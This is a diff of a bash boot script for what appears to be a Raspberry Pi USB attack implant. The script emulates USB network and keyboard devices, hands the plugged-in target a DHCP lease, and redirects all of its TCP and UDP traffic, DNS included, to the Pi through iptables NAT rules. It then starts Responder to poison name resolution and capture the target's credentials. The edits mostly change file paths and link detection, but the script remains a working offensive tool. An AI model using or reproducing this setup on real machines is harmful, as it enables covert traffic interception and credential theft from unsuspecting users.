@@ -55,6 +55,10 @@ IF_DHCP_RANGE="172.16.0.2,172.16.0.3"
 # drivers. If the target hasn't enough time to install drivers, this value should be raised.
 RETRY_COUNT_LINK_DETECTION=120
 
+
+# find working dir of script
+wdir=$( cd $(dirname $BASH_SOURCE[0]) && pwd)
+
 # ====================
 # USB Init
 # ====================
@@ -128,7 +132,7 @@ mkdir -p functions/hid.g1
 echo 1 > functions/hid.g1/protocol
 echo 1 > functions/hid.g1/subclass
 echo 8 > functions/hid.g1/report_length
-cat /home/pi/report_desc > functions/hid.g1/report_desc
+cat $wdir/report_desc > functions/hid.g1/report_desc
 
 
 
@@ -192,9 +196,18 @@ while [[ $count -lt $RETRY_COUNT_LINK_DETECTION ]]; do
 	echo "Operstate usb0 $(cat /sys/class/net/usb0/operstate)"
 	echo "Operstate usb1 $(cat /sys/class/net/usb1/operstate)"
 
-	# check RNDIS for link
 	if [[ $(</sys/class/net/usb0/carrier) == 1 ]]; then
-# ToDo: special case: Linux Systems detecting RNDIS should use CDC ECM anyway
+		# special case: macOS/Linux Systems detecting RNDIS should use CDC ECM anyway
+		# make sure ECM hasn't come up, too
+		sleep 0.5
+		if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
+			echo "Link detected on usb1"; sleep 2
+			device="usb1"
+			ifconfig usb0 down
+
+			break
+		fi
+
 		echo "Link detected on usb0"; sleep 2
 		device="usb0"
 		ifconfig usb1 down
@@ -210,6 +223,9 @@ while [[ $count -lt $RETRY_COUNT_LINK_DETECTION ]]; do
 
 		break
 	fi
+
+	# check RNDIS for link
+
 	sleep 0.5
 	let count=count+1
 #	echo $device
@@ -223,12 +239,11 @@ if [ "$device" != "none" ]; then
 	# setup interface with correct IP
 	ifconfig $device $IF_IP netmask $IF_MASK
 
-
 	# remove old DHCP leases
 	rm /var/lib/misc/dnsmasq.leases 2> /dev/null
 
 	# update dnsmasq DHCP setup
-cat << EOF > /home/pi/dnsmasq.conf
+cat << EOF > $wdir/dnsmasq.conf
 port=0
 listen-address=$IF_IP
 dhcp-range=$IF_DHCP_RANGE,$IF_MASK,5m
@@ -264,12 +279,15 @@ EOF
 	# 	this for example fetches traffic to DNS servers, which aren't overwritten by our DHCP lease
 	#	an UDP request to 8.8.4.4:53 from our target would end up here on 127.0.0.1:53, thanks to
 	#	the static routes for 0.0.0.0/1 and 128.0.0.0/1
-	iptables -t nat -A PREROUTING -i $device -p tcp -m addrtype ! --dst-type BROADCAST,LOCAL -j REDIRECT
-	iptables -t nat -A PREROUTING -i $device -p udp -m addrtype ! --dst-type BROADCAST,LOCAL -j REDIRECT
+	iptables -t nat -A PREROUTING -i $device -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+	iptables -t nat -A PREROUTING -i $device -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
 
 
 	# start DHCP server (listening on IF_IP)
-	dnsmasq -C /home/pi/dnsmasq.conf
+	dnsmasq -C $wdir/dnsmasq.conf
+
+	# add route back through target (for ICS)
+	route add -net default gw 172.16.0.2
 
 # ========================================
 # Attack target through established Network
@@ -302,7 +320,7 @@ EOF
 	# 	8) Responder runs in a screen session, thus the output could be attached to a SSH session on the Pi:
 	#		$ ssh pi@172.16.0.1
 	#		$ sudo screen -d -r
-	screen -dmS responder bash -c "cd /home/pi/Responder/; python Responder.py -I $device -f -v -w -F"
+	screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $device -f -v -w -F"
 
 
 else
